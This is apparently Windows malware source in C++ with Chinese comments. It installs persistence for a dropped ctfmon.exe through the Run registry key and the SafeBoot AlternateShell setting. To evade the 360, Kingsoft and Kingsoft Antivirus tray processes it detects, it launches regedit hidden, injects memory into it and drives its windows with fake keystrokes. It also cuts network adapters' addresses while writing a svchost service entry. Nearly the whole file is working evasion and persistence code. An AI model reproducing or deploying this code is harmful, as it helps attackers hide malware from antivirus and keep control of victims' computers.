//#include "stdafx.h"
#include "windows.h"
#include "TCHAR.h"
#include "Tlhelp32.h"
#include "commctrl.h"

#include "Iphlpapi.h"
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")

#include "MyCommon.h"
#include "until.h"


//#include "myprocess.h"

HWND hRegWnd;
HWND hParentWnd;
HWND hSysTreeViewWnd;
HWND hSysListViewWnd;
HWND hWndFromProcessID;
HWND hWndFromClassName;

char *wWindowName="\xE8\x6C\x8C\x51\x68\x88\x16\x7F\x91\x8F\x68\x56";
DWORD dwWindowProcessId = 0;



LPVOID pbuf1;
LPVOID pbuf2;
LPVOID pbuf3;

HANDLE hProcess;


#ifdef UNICODE
#define _tmemset wmemset
/*#pragma comment(lib,"foxsdkW.lib")*/

#else
/*#pragma comment(lib,"foxsdkA.lib")*/
#define _tmemset memset


#endif



//获取子窗口
//hParentWnd:父窗口句柄
//lparam:

BOOL CALLBACK GetChildWnd(HWND hParentWnd,LPARAM lParam)
{
	BOOL dwResult=TRUE;

	TCHAR szClassName[MAX_PATH]={0};
	TCHAR szWindowText[MAX_PATH]={0};

	if (!GetClassName(hParentWnd, szClassName,MAX_PATH)||
		!GetWindowText(hParentWnd,szWindowText,MAX_PATH)||
		_tcsncmp(szClassName,TEXT("SysListView32"),0x100)||
		(dwResult =_tcsncmp(szWindowText,TEXT("FolderView"),0x100)) != 0 
		)
	{
		dwResult=TRUE;
	}
	else
	{
		hRegWnd=hParentWnd;
	}
	return dwResult;
}


BOOL CALLBACK EnumWnd(HWND hWnd, LPARAM lParam)
{
	DWORD dwProcessId = 0;
	GetWindowThreadProcessId(hWnd, &dwProcessId);
	TCHAR szWndText[MAX_PATH]={0};
	GetWindowText(hWnd,szWndText,MAX_PATH);

	if(_tcsicmp(szWndText,TEXT("C:\\WINDOWS"))&&_tcscmp(szWndText,TEXT("WINDOWS")))
	{
		return TRUE;
	}

	hRegWnd=NULL;
	EnumChildWindows(hWnd, GetChildWnd, 0);

	if(!hRegWnd)
	{
		return TRUE;
	}
	hParentWnd= hWnd;


// 	SendMessageA(hRegWnd,WM_KEYDOWN,VK_RETURN,0);
// 	SendMessageA(hRegWnd,WM_KEYUP,VK_RETURN, 0);
	return FALSE;
}

typedef struct REGCHILDWND 
{
	TCHAR *szClassName;
	HWND  hWnd;	
}REGCHILDWND,*pREGCHILDWND;

BOOL CALLBACK EnumChildFunc2(HWND hWnd,LPARAM lParam )
{

	BOOL dwResult=TRUE;

	pREGCHILDWND regchild=(pREGCHILDWND)lParam;

	TCHAR szClassName[MAX_PATH]={0};
	if (!GetClassName(hWnd,szClassName,MAX_PATH)||
		(dwResult = _tcsncmp(szClassName,regchild->szClassName,0x100)) != 0 )
		dwResult = 1;
	else
		regchild->hWnd=hWnd;
	return dwResult;
}

//模拟双击程序
BOOL Emulate_Exlplorer_Click(PTCHAR szRunExePath,WORD dwShow,PPROCESS_INFORMATION pProcessInfor)
{


	if (!pProcessInfor)
	{
		return FALSE;
	}
	STARTUPINFO StartupInfo={0};

	//_tmemset(&StartupInfo,0,sizeof(STARTUPINFO));
	StartupInfo.cb=sizeof(StartupInfo);
	StartupInfo.dwFlags =STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow =dwShow;

	
	int  dwNum = 0;

	PTCHAR szTempBuf[MAX_PATH*2]={0};

	_tcsncpy((PTCHAR)szTempBuf,(PTCHAR)szRunExePath,MAX_PATH*2);

	for (dwNum=0;dwNum<10;dwNum++)
	{
		if (CreateProcess(0,(LPTSTR)szTempBuf, 0, 0, 0, 0, 0, 0, &StartupInfo,pProcessInfor))
			return TRUE;
	}
	return FALSE;

}


void HideWnd(HWND hWnd)
{
	DWORD dwExStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
	dwExStyle|=WS_EX_LEFTSCROLLBAR;

	for (int i=0;i<=100;i++)
	{
		SetWindowLong(hWnd,WS_EX_LEFTSCROLLBAR,dwExStyle);
		SetWindowPos(hWnd,0, 0, 0, 0, 0, SWP_HIDEWINDOW|SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER);
		ShowWindow(hWnd,SW_HIDE);

		//WM_SYSCOMMAND,SC_MINIMIZE,
		//PostMessage(hWnd,WM_SYSCOMMAND.SC_MINIMIZE,0);

		Sleep(100);
	}
}


HWND SendKeyClickMessage(TCHAR *szWndName)
{
	DWORD dwCount;


	HWND hWnd=0;
	int wShowWindow=0;

	do
	{
		dwCount=0;
		if (hWnd){
			return hWnd;
		}


		PROCESS_INFORMATION ProcessInformation={0};


		Emulate_Exlplorer_Click(TEXT("explorer.exe /select, C:\\WINDOWS\\regedit.exe"),0,&ProcessInformation);

		//OutputDebugStringA("ssss");

		SetForegroundWindow(hParentWnd);
		SetActiveWindow(hParentWnd);


		//keybd_event(VK_RETURN,0,WM_KEYDOWN,0);
		//keybd_event(VK_RETURN,0,WM_KEYUP,0);

		//keybd_event(VK_DOWN,0,WM_KEYDOWN,0);
		//keybd_event(VK_DOWN,0,WM_KEYUP,0);
 		keybd_event(VK_RETURN,0,0,0);
 		keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP,0);
		//PostEnterKey(hParentWnd);
		//	_asm int 3
// 		PostMessage(hClickWnd,Msg,wParam,0);
// 		PostMessage(hClickWnd,Msg+1,wParam,0);

		while(dwCount<=500)
		{

			hWnd = FindWindow("RegEdit_RegEdit",0);
			
			if (hWnd)
			{

			///
				HideWnd(hWnd);

				return hWnd;
			}
			Sleep(10);
			dwCount++;
		}
		wShowWindow++;
	}
	while ( wShowWindow < 1000+50 );

	return 0;
}



bool sub_40234B(WORD wShowWindow)
{


	bool bRet=false;

	
	PROCESS_INFORMATION ProcessInformation={0};
		

	if (!Emulate_Exlplorer_Click(TEXT("explorer.exe /select, C:\\WINDOWS\\regedit.exe"),wShowWindow,&ProcessInformation))
	{
		return bRet;
	}


	wShowWindow= 0;
	while ( 1 )
	{
		EnumWindows(EnumWnd,ProcessInformation.dwProcessId);
		if (hParentWnd)
			break;
			Sleep(1);
		++wShowWindow;
		if ( wShowWindow >= 1000 )
		{
			if ( !hParentWnd)
				goto LABEL_19;
			break;
		}
	}

// 	wShowWindow=0;
 	HWND hWnd=SendKeyClickMessage("注册表编辑器");

	Sleep(1000);

// 	do
// 	{
// 		hWnd = FindWindowW(0, (wchar_t*)wWindowName);
// 		//	*((_DWORD *)v7 + 6) = v10;
// 		if (hWnd)
// 			break;
// 
// 
// 		Sleep(1);
// 		wShowWindow++;
// 	}
// 	while ( wShowWindow < 1000 );

	if (hWnd)
	{
		SendMessage(hParentWnd,WM_CLOSE,0,0);
		//DWORD dwExStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
		//dwExStyle|=WS_EX_LEFTSCROLLBAR;
		//SetWindowLong(hWnd,WS_EX_LEFTSCROLLBAR,dwExStyle);
		//SetWindowPos(hWnd,0, 0, 0, 0, 0, SWP_HIDEWINDOW|SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER);
		GetWindowThreadProcessId(hWnd,&dwWindowProcessId);
		hProcess = OpenProcess(PROCESS_TERMINATE|PROCESS_VM_OPERATION |PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,0,dwWindowProcessId);
		
		REGCHILDWND regchild;
		regchild.hWnd=0;
		regchild.szClassName=TEXT("SysTreeView32");


		EnumChildWindows(hWnd,EnumChildFunc2,(LPARAM)(&regchild));
		hSysTreeViewWnd=regchild.hWnd;


		regchild.hWnd=0;
		regchild.szClassName=TEXT("SysListView32");
		EnumChildWindows(hWnd,EnumChildFunc2,(LPARAM)(&regchild));
		hSysListViewWnd=regchild.hWnd;



		if (hSysListViewWnd&&hSysTreeViewWnd)
		{


//			DWORD flAllocationType=MEM_DECOMMIT|PAGE_EXECUTE_WRITECOPY|PAGE_EXECUTE|PAGE_READONLY|PAGE_READWRITE;
			pbuf1=VirtualAllocEx(hProcess,0,0x28,MEM_COMMIT,0x4);

			pbuf2=VirtualAllocEx(hProcess,0,60,MEM_COMMIT, 4);
			pbuf3=VirtualAllocEx(hProcess, 0,256,MEM_COMMIT,4);
			bRet=true;
		}
	}
LABEL_19:

	return bRet;
}

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,          // Note: this is kernel mode only
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef struct
{
	DWORD ExitStatus; // 接收进程终止状态
	DWORD PebBaseAddress; // 接收进程环境块地址
	DWORD AffinityMask; // 接收进程关联掩码
	DWORD BasePriority; // 接收进程的优先级类
	ULONG UniqueProcessId; // 接收进程ID
	ULONG InheritedFromUniqueProcessId; //接收父进程ID
} PROCESS_BASIC_INFORMATION;

typedef 
DWORD (WINAPI *NTQUERYINFORMATIONPROCESS)(
	__in          HANDLE ProcessHandle,
	__in          PROCESSINFOCLASS ProcessInformationClass,
	__out         PVOID ProcessInformation,
	__in          ULONG ProcessInformationLength,
	__out_opt     PULONG ReturnLength
	);

NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;

DWORD QueryInheritedFromUniqueProcessId(DWORD dwProcessId)
{
	DWORD InheritedFromUniqueProcessId=-1;

	NtQueryInformationProcess =(NTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleA("ntdll"),"NtQueryInformationProcess");
	if (NtQueryInformationProcess)
	{
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwProcessId);
		if (hProcess)
		{
			PROCESS_BASIC_INFORMATION pbi;

			if(!NtQueryInformationProcess(hProcess,ProcessBasicInformation,&pbi,sizeof(PROCESS_BASIC_INFORMATION),0))
			{
				InheritedFromUniqueProcessId=pbi.InheritedFromUniqueProcessId;				
			}
			CloseHandle(hProcess);
		}
	}
	return InheritedFromUniqueProcessId;
}





DWORD FindProcessID(DWORD InheritedFromUniqueProcessId)
{


	if (InheritedFromUniqueProcessId != -1 )
	{

		HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

		PROCESSENTRY32 pe32;

		pe32.dwSize = sizeof( PROCESSENTRY32 );

		Process32First( hSnapshot, &pe32 );
		do
		{

			if ( pe32.th32ProcessID == InheritedFromUniqueProcessId )
				break;
		}while (Process32Next( hSnapshot, &pe32 ));
		CloseHandle(hSnapshot);
	}
	return InheritedFromUniqueProcessId;
}

HTREEITEM GetTreeRegWnd(HTREEITEM hItemParentWnd,CHAR *szRegPath)//查找SafeBoot句柄
{


	if(!hItemParentWnd)
	{
		return 0;
	}

	HTREEITEM hItemChildWnd=(HTREEITEM)SendMessage(hSysTreeViewWnd, TVM_GETNEXTITEM,TVGN_CHILD,(LPARAM)hItemParentWnd);
	if (!hItemChildWnd)
	{
		return 0;
	}

	while ( 1 )
	{

		CHAR  ReadBuffer[0X100];

		memset(ReadBuffer,0,0x100);

		TVITEM Tvitem;
		_tmemset((PTCHAR)&Tvitem,0,sizeof(TVITEM));

		Tvitem.mask=TVIF_HANDLE|TVIF_TEXT;
		Tvitem.hItem=hItemChildWnd;
		Tvitem.pszText=(LPTSTR)pbuf3;
		Tvitem.cchTextMax=MAX_PATH;


		WriteProcessMemory(hProcess,pbuf1,(LPVOID)&Tvitem, sizeof(TVITEM),0);
		SendMessage(hSysTreeViewWnd,TVM_GETITEMA,0,(LPARAM)pbuf1);//获取句柄内容

		ReadProcessMemory(hProcess,pbuf3,ReadBuffer, 0x100, 0);
		//__asm int 3

		if ( !strcmp(szRegPath,ReadBuffer))
			break;
		hItemChildWnd = (HTREEITEM)SendMessage(hSysTreeViewWnd, TVM_GETNEXTITEM,TVGN_NEXT,(LPARAM)hItemChildWnd);
		if ( !hItemChildWnd ) return 0; 
	}
	return hItemChildWnd;
}

DWORD GetListRegOrder(CHAR *szRegPath)//查找AlternateShell的序号
{


	if (!hSysListViewWnd)
	{
		return -1;
	}

	DWORD dwNnumberofitems= SendMessage(hSysListViewWnd,LVM_GETITEMCOUNT,0,0);
	
	if ( dwNnumberofitems<=0)
	{
		return -1;
	}

	DWORD dwItemIndex=0;
	while ( 1 )
	{



		CHAR  ReadBuffer[0x100];

		memset(ReadBuffer,0,0x100);

		LVITEM Lvitem;

		_tmemset((PTCHAR)&Lvitem,0,sizeof(LVITEM));


		Lvitem.mask=LVIF_TEXT;
		Lvitem.iItem=dwItemIndex;
		Lvitem.pszText=(LPTSTR)pbuf3;
		Lvitem.cchTextMax=MAX_PATH;


		WriteProcessMemory(hProcess, pbuf2, (LPVOID)&Lvitem,sizeof(LVITEM), 0);
		SendMessage(hSysListViewWnd,LVM_GETITEMA,0,(LPARAM)pbuf2);
		ReadProcessMemory(hProcess, pbuf3, ReadBuffer, 0x100, 0);
		if ( !strcmp(szRegPath,ReadBuffer))
			break;
		++dwItemIndex;
		if (dwItemIndex>dwNnumberofitems)
		{
			return -1;
		}

	}
	return dwItemIndex;

}



// char szTreeReg[10][100]=
// {
// 	"HKEY_LOCAL_MACHINE",
// 	"SYSTEM",
// 	"CurrentControlSet",
// 	"Control",
// 	"SafeBoot"
// };
// 
// char szListReg[10][100]=
// {
// 	"AlternateShell"
// };


CHAR szTreeReg[10][100]=
{
	"HKEY_CURRENT_USER",
	"Software",
	"Microsoft",
	"Windows",
	"CurrentVersion",
	"Run",
	""	
};

CHAR szListReg[10][100]=
{
	"svchost",
	""
};

/*HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run*/



BOOL CALLBACK GetWndFromID(HWND hWnd, LPARAM lParam)
{
	DWORD result=TRUE; // eax@3

	TCHAR szClassName[MAX_PATH]={0};
	DWORD dwProcessId = 0;
	GetWindowThreadProcessId(hWnd, &dwProcessId);
	if (dwProcessId !=(DWORD)lParam||
		!GetClassName(hWnd, szClassName,MAX_PATH)||
		(result = _tcsncmp(szClassName, TEXT("#32770"), 0x100)) != 0 )
		result = 1;
	else
		hWndFromProcessID = hWnd;
	return result;
}

BOOL CALLBACK GetWndFromClassName(HWND hWnd, LPARAM lParam)
{

	TCHAR szClassName[MAX_PATH]={0};
	if (GetClassName(hWnd, szClassName, MAX_PATH) )
	{
		if (!_tcscmp(szClassName,(char*)lParam) && !(GetWindowLong(hWnd, -16) & 0x800))
		{
			hWndFromClassName=hWnd;
			return 0;
		}
	}
	return 1;
}


HTREEITEM FindItemWnd()
{

	HTREEITEM hFindWindow;

	//得到项目的句柄(参数：TVGN_ROOT得到根句柄)
	HTREEITEM hItemRootWnd=(HTREEITEM)SendMessage(hSysTreeViewWnd,TVM_GETNEXTITEM,TVGN_ROOT,0);
	if (!hItemRootWnd)
	{
		return 0;
	}

	//选择一个item
	SendMessage(hSysTreeViewWnd, TVM_SELECTITEM ,TVGN_CARET,(LPARAM)hItemRootWnd);

	//展开或折叠指定item(参数：TVE_EXPAND展开指定项目)
	SendMessage(hSysTreeViewWnd, TVM_EXPAND, TVM_EXPAND,(LPARAM)hItemRootWnd);
	//SendMessageA(hSysTreeViewWnd, 0x1102, 0x1102,(LPARAM)hWindow);
	DWORD i=0;

	while (strlen(szTreeReg[i]))
	{


		hFindWindow =GetTreeRegWnd(hItemRootWnd,szTreeReg[i]);

		if (hFindWindow)
		{

			SendMessage(hSysTreeViewWnd,TVM_SELECTITEM ,TVGN_CARET,(LPARAM)hFindWindow);

			SendMessage(hSysTreeViewWnd, TVM_EXPAND, TVM_EXPAND,(LPARAM) hFindWindow);
			Sleep(0xA);
			++i;
			hItemRootWnd= hFindWindow;
		}
		else break;
	}

	return hFindWindow;
}


DWORD WriteReg(TCHAR *szPath)
{

	if (!hSysTreeViewWnd||!hSysListViewWnd)
	{
		return 0;
	}
	//_asm int 3

	HTREEITEM hFindWindow=FindItemWnd();
	if (!hFindWindow)
	{
		return FALSE;
	}



	//OutputDebugStringA("11111");
	DWORD i=0;
	DWORD dwItemIndex=0;

	// 		do
	// 		{
	// 			dwItemIndex=GetListRegOrder(szListReg[i]);
	// 			if ( dwItemIndex!=-1)
	// 				break;
	// 			Sleep(1);
	// 			++i;
	// 		}
	// 		while (strlen(szListReg[i]));
	// 
	// 		if (dwItemIndex==-1){
	// 			dwItemIndex=0;
	// 		}



	LVITEM *Lvitem=new LVITEM;;
	memset((char*)Lvitem,0,sizeof(LVITEM));


	Lvitem->mask=LVIF_STATE;
	Lvitem->iItem=dwItemIndex;
	Lvitem->state=LVIS_SELECTED;
	Lvitem->stateMask=LVIS_SELECTED;

	DWORD dwWriteMem=0;
	WriteProcessMemory(hProcess,pbuf2,(LPVOID)Lvitem,sizeof(LVITEM),&dwWriteMem);
	SendMessage(hSysListViewWnd,LVM_SETITEM,dwWriteMem,(LPARAM)pbuf2);

	delete Lvitem;

	//	GlobalFree(Lvitem);

	//选中后按回车键
	PostMessage(hSysListViewWnd, WM_KEYDOWN,VK_RETURN,(LPARAM) dwWriteMem);
	PostMessage(hSysListViewWnd,WM_KEYUP,VK_RETURN,(LPARAM) dwWriteMem);




	//		DWORD i=0;

	do
	{

		//__asm int 3
		hWndFromProcessID=(HWND)dwWriteMem;
		EnumWindows(GetWndFromID,(LPARAM)dwWindowProcessId);
		if (hWndFromProcessID ==(HWND)dwWriteMem)
		{
			Sleep(1);
			continue;
		}


		//OutputDebugStringA("22222");


		UINT uFlags=SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER|SWP_NOREDRAW;

		SetWindowPos(hWndFromProcessID,(HWND)dwWriteMem,dwWriteMem, dwWriteMem, dwWriteMem, dwWriteMem, uFlags);

		hWndFromClassName=(HWND)dwWriteMem;
		EnumChildWindows(hWndFromProcessID,GetWndFromClassName,(LPARAM)"Edit");
		if ( hWndFromClassName != (HWND)dwWriteMem )
		{
	//		OutputDebugStringA("3333333");

			TCHAR szOldName[MAX_PATH]={0};
			SendMessage(hWndFromClassName, WM_GETTEXT, MAX_PATH, (LPARAM)szOldName);

			//OutputDebugStringA(szOldName);
	//		OutputDebugStringA("444444");


			if(_tcsicmp(szOldName,szPath))
			{

				SendMessage(hWndFromClassName, WM_SETTEXT, dwWriteMem, (LPARAM)szPath);

				EnumChildWindows(hWndFromProcessID,GetWndFromClassName,(LPARAM)"确定");

				//选中后按回车键
				PostMessage(hWndFromClassName, WM_KEYDOWN,VK_RETURN,(LPARAM) dwWriteMem);
				PostMessage(hWndFromClassName,WM_KEYUP,VK_RETURN,(LPARAM) dwWriteMem);

//				SendMessage(hWndFromProcessID, WM_COMMAND, 1, (LPARAM)dwWriteMem);
				Sleep(1000);
			}
			break;
		}
		++i;
	}
	while (i<1000 );

	return 0;
}

int RegWriteNetMan(char *szPath)
{
	HKEY hKey;
	if ( RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) )
		return 0;
	RegSetValueExA(hKey, "Netman", 0, 1u, (const BYTE *)szPath, strlen(szPath));
	RegCloseKey(hKey);

//	MyCommon::InstallService()
	return 1;
}


BOOL Loader1(TCHAR *strFileName)
{
	//if (IsExplorerParentProcess()||
	if(!StrStr(GetCommandLineA(),"-mi"))
	{
		RegWriteNetMan(strFileName);
	} 
	else
	{
		My_WinExec(strFileName);
	}
	return TRUE;

}

BOOL Loader2()
{



// 	__try
// 	{


		if ( sub_40234B(0) )
		{

			//__asm int 3

			//OutputDebugStringA("sssssss");

			CHAR szWindowsPath[MAX_PATH] = {0};
			GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));
			strcat(szWindowsPath,"\\meed\\ctfmon.exe");
			//_asm int 3
			WriteReg(szWindowsPath);

			DWORD dwExitCode;
			GetExitCodeProcess(hProcess,&dwExitCode);
			TerminateProcess(hProcess,dwExitCode);
			// 		do 
			// 		{
			// 			Sleep(1);
			// 		} while (!TerminateProcess(hProcess,dwExitCode));
			// 		if (hProcess) CloseHandle(hProcess);

			//CProcess::KillAllProcessByName(TEXT("regedit.exe"));

			Sleep(0x64u);


		}
// 	}
// 
// 	_except(EXCEPTION_EXECUTE_HANDLER)
// 	{
// 		return 1;
// 	}
	return 0;
	//MoveFileA((LPCSTR)v45, (LPCSTR)v44);

}






typedef BOOL(WINAPI *DHCPNOTIFYPROC)(
									 LPWSTR lpwszServerName, // 本地机器为NULL
									 LPWSTR lpwszAdapterName, // 适配器名称
									 BOOL bNewIpAddress, // TRUE表示更改IP
									 DWORD dwIpIndex, // 指明第几个IP地址，如果只有该接口只有一个IP地址则为0
									 DWORD dwIpAddress, // IP地址
									 DWORD dwSubNetMask, // 子网掩码
									 int nDhcpAction ); // 对DHCP的操作 0:不修改, 1:启用 DHCP，2:禁用 DHCP

BOOL NotifyIPChange(LPCTSTR lpszAdapterName, int nIndex, LPCTSTR pIPAddress, LPCTSTR pNetMask)
{
	BOOL			bResult = FALSE;
	HINSTANCE		hDhcpDll;
	DHCPNOTIFYPROC	pDhcpNotifyProc;
	WCHAR wcAdapterName[256];

	MultiByteToWideChar(CP_ACP, 0, lpszAdapterName, -1, wcAdapterName,256);

	if((hDhcpDll = LoadLibrary("dhcpcsvc")) == NULL)
		return FALSE;

	if((pDhcpNotifyProc = (DHCPNOTIFYPROC)GetProcAddress(hDhcpDll, "DhcpNotifyConfigChange")) != NULL)
		if((pDhcpNotifyProc)(NULL, wcAdapterName, TRUE, nIndex, inet_addr(pIPAddress), inet_addr(pNetMask), 0) == ERROR_SUCCESS)
			bResult = TRUE;

	FreeLibrary(hDhcpDll);
	return bResult;
}


void ProhibitNet1(CHAR *lpszDstExeName)
{

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	pAdapterInfo = (IP_ADAPTER_INFO *) malloc( sizeof(IP_ADAPTER_INFO) );
	DWORD ulOutBufLen = sizeof(IP_ADAPTER_INFO);

	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) != ERROR_SUCCESS) {
		GlobalFree (pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) malloc (ulOutBufLen);
	}

	if ((dwRetVal = GetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
	{
		pAdapter = pAdapterInfo;
		//int i=0;
		while (pAdapter)
		{

			for (int i=0;i<8;i++)
			{
				NotifyIPChange(pAdapter->AdapterName,0,"1.1.1.1",pAdapter->IpAddressList.IpMask.String);

			}
			// 			Ip_Info[i].dwIP=inet_addr(pAdapter->IpAddressList.IpAddress.String);
			// 			Ip_Info[i].dwMask=inet_addr(pAdapter->IpAddressList.IpMask.String);
			// 			strcpy(Ip_Info[i].AdapterName,pAdapter->AdapterName);
			pAdapter = pAdapter->Next;
		}


		MyCommon::SetSvcHostReg(lpszDstExeName,1); 
		Sleep(1000*60);

		pAdapter = pAdapterInfo;
		//i=0;
		while (pAdapter)
		{

			NotifyIPChange(pAdapter->AdapterName,0,pAdapter->IpAddressList.IpAddress.String,pAdapter->IpAddressList.IpMask.String);

			//netsh interface ip set address name="本地连接" gateway=192.168.1.1 gwmetric=0

			// 			CHAR szNet[MAX_PATH*2]={0};
			// 			strcpy(szNet,"cmd /c netsh interface ip set address name=\"本地连接\" gateway=");
			// 			strcat(szNet,pAdapter->GatewayList.IpAddress.String);
			// 			strcat(szNet," gwmetric=0");
			// 			//_asm int 3
			// 			//OutputDebugStringA(szNet);
			// 			WinExec(szNet,0);

			pAdapter = pAdapter->Next;
		}

	}

	free(pAdapterInfo);

}
BOOL MyCreateSafe(TCHAR *szPath)
{
	DWORD dwStart=3;
	DWORD dwType=1;
	DWORD dwErrorControl=1;
	HKEY hKey;
	TCHAR szRegKey[MAX_PATH]=_T("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\option");
	//_tcscat_s(szRegKey,MAX_PATH,szServiceName);
	if (RegCreateKey(HKEY_LOCAL_MACHINE,szRegKey,&hKey)!=ERROR_SUCCESS)
	{
		//cout<<"RegCreateKey Fail"<<endl;
		return FALSE;
	}
	RegSetValueEx(hKey,"AlternateShell",0,REG_SZ,(BYTE*)szPath,strlen(szPath));
	//"UseAlternateShell"=dword:00000001
	RegSetValueEx(hKey,"UseAlternateShell",0,REG_DWORD,(BYTE*)&dwType,4);
	RegCloseKey(hKey);

	TCHAR szRegKey2[MAX_PATH]=_T("SYSTEM\\CurrentControlSet\\Control\\SafeBoot");
	if (RegCreateKey(HKEY_LOCAL_MACHINE,szRegKey2,&hKey)!=ERROR_SUCCESS)
	{

		return FALSE;
	}

	RegSetValueEx(hKey,"AlternateShell",0,REG_SZ,(BYTE*)szPath,strlen(szPath));
	//"UseAlternateShell"=dword:00000001
	RegSetValueEx(hKey,"UseAlternateShell",0,REG_DWORD,(BYTE*)&dwType,4);
	RegCloseKey(hKey);
	return TRUE;
}

// LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
// {
// 	CHAR szWindowsPath[MAX_PATH] = {0};
// 
// 	switch (message)
// 	{
// 	case WM_CREATE:
// 		SetProcessShutdownParameters(0,SHUTDOWN_NORETRY);
// //		SetTimer(hWnd,5000,0,0);
// 		break;
// 	case  WM_TIMER:
// //		OutputDebugStringA("ddddddd");
// 		SetProcessShutdownParameters(0,SHUTDOWN_NORETRY);
// 		break;
// 
// 	case WM_DESTROY:
// 	//	::ExitProcess(0);
// 		break;
// 	case WM_QUERYENDSESSION:
// 		do 
// 		{
// 			Sleep(1);
// 		} while (GetProcessID("360tray.exe"));
// 		
// 		GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));
// 		strcat(szWindowsPath,"\\meed\\ctfmon.exe");
// 
// 		MyCreateSafe(szWindowsPath);
// 		return TRUE;
// 
// 	default:
// 		return DefWindowProc(hWnd, message, wParam, lParam);
// 	}
// 
// 	return 0;
// }

// BOOL WINAPI Wait360Exit()
// {
// 
// 	WNDCLASSEXA wcex = {0};
// 	wcex.cbSize			= sizeof(WNDCLASSEX);
// 	wcex.style			= CS_HREDRAW | CS_VREDRAW;
// 	wcex.lpfnWndProc	= WndProc;
// 	wcex.hInstance		= (HINSTANCE)GetModuleHandleA;
// 	wcex.hIcon			= ::LoadIcon( NULL, IDI_WINLOGO );
// 	wcex.hCursor		= ::LoadCursor( NULL, IDC_ARROW );
// 	wcex.hbrBackground	= (HBRUSH)COLOR_WINDOW;
// 	wcex.lpszClassName	= "sfdfds";
// 	
// 	::RegisterClassExA(&wcex);
// 
// 	HWND g_hWndMain = ::CreateWindowA(wcex.lpszClassName, "", WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, wcex.hInstance, NULL);
// 	if (NULL != g_hWndMain)
// 	{
// 		::ShowWindow(g_hWndMain, SW_HIDE);
// 		::UpdateWindow(g_hWndMain);
// 
// 
// 		MSG msg;
// 		while (::GetMessage(&msg, NULL, 0, 0)) 
// 		{
// 			::TranslateMessage(&msg);
// 			::DispatchMessage(&msg);
// 		}
// 	}
// 
// 	return TRUE;
// }

// void Loader3()
// {
// 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Wait360Exit,0, 0, NULL);
// }


void  WriteAutoRun1(char *lpszDstExeName)
{
	//_asm int 3

// 	 MyCommon::SetSvcHostReg(lpszDstExeName,0);
// 	 return;

	if(IsRegExsit()||
	   StrStr(GetCommandLineA(),"-svchost")
	   //MyCommon::IsServerStart("winio")
	   )
	{
		return;
	}

	if (GetProcessID("360tray.exe")&&!MyCommon::IsServerStart("ctfmon"))
	{
		Loader1(lpszDstExeName);
	}
	else 
	{
		if (GetProcessID("KSafeTray.exe")||
			GetProcessID("kxetray.exe")||
			MyCommon::IsServerStart("ctfmon"))
		{
			MyCommon::SetSvcHostReg(lpszDstExeName,1);
		}
		else MyCommon::SetSvcHostReg(lpszDstExeName,0);

	}
}


